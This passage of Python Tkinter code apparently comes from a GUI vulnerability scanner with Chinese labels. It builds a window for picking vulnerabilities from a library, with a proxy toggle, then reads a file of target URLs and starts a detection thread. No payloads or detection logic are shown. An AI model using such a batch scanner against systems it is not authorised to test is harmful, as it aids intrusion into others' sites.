            self.output_text.insert(tk.END, text + "\n", tag)
        else:
            self.output_text.insert(tk.END, text + "\n")
        self.output_text.config(state=tk.DISABLED)
        self.output_text.see(tk.END)  # 滚动到最底部

    def save_output(self):
        file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text Files", "*.txt")])
        if file_path:
            with open(file_path, "w") as file:
                output_text = self.output_text.get("1.0", tk.END)
                file.write(output_text)

    def open_vulnerabilities_window(self):
        vulnerabilities_window = Toplevel(self.root)
        vulnerabilities_window.title("漏洞库")
        vulnerabilities_window.geometry("800x600")

        # 创建一个Canvas作为容器
        canvas = tk.Canvas(vulnerabilities_window, width=800, height=600)
        canvas.pack(fill=tk.BOTH, expand=True)

        # 创建一个滚动条，并绑定到Canvas
        scrollbar = tk.Scrollbar(vulnerabilities_window, command=canvas.yview)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        canvas.configure(yscrollcommand=scrollbar.set)

        # 创建一个滚动区域框架，将内容放置在其中
        scrollable_frame = tk.Frame(canvas)
        scrollable_frame.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")

        select_all_var = IntVar()
        select_all_checkbox = Checkbutton(scrollable_frame, text="全选", variable=select_all_var,
                                          command=lambda: self.select_all_vulnerabilities(select_all_var))
        select_all_checkbox.pack(anchor=tk.W)

        proxy_var = IntVar()
        proxy_checkbox = Checkbutton(scrollable_frame, text="开启代理", variable=self.proxies_var)
        proxy_checkbox.pack(anchor=tk.W)


        detect_button = tk.Button(scrollable_frame, text="检测", command=self.detect_vulnerabilities_from_library)
        detect_button.pack(anchor=tk.W, padx=5)

        for index, vulnerability in enumerate(self.vulnerabilities):
            var = IntVar()
            self.vars.append(var)
            checkbox = Checkbutton(scrollable_frame, text=vulnerability, variable=var)
            checkbox.pack(anchor=tk.W)

        # 配置Canvas以响应滚动条事件
        canvas.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))

        # 绑定鼠标滚轮事件
        canvas.bind_all("<MouseWheel>", lambda e: canvas.yview_scroll(int(-1 * (e.delta / 120)), "units"))

    def select_all_vulnerabilities(self, select_all_var):
        select_all_state = select_all_var.get()
        for var in self.vars:
            var.set(select_all_state)

    def detect_vulnerabilities_from_library(self):
        file_path = self.file_entry.get().strip()
        if not file_path:
            messagebox.showerror("错误", "请输入文件路径")
            return

        with open(file_path, "r") as file:
            urls = file.read().splitlines()

        selected_vulnerabilities = []
        for index, var in enumerate(self.vars):
            if var.get() == 1:
                selected_vulnerabilities.append(self.vulnerabilities[index])

        self.output_text.config(state=tk.NORMAL)
        self.output_text.delete("1.0", tk.END)
        self.output_text.config(state=tk.DISABLED)

        self.stop_detection_flag = False

        detection_thread = threading.Thread(target=self.perform_detection, args=(urls, selected_vulnerabilities))
        detection_thread.start()

# 创建 VulnDetection 实例
vuln_detection = VulnDetection()

if __name__ == "__main__":
    VulnDetection()
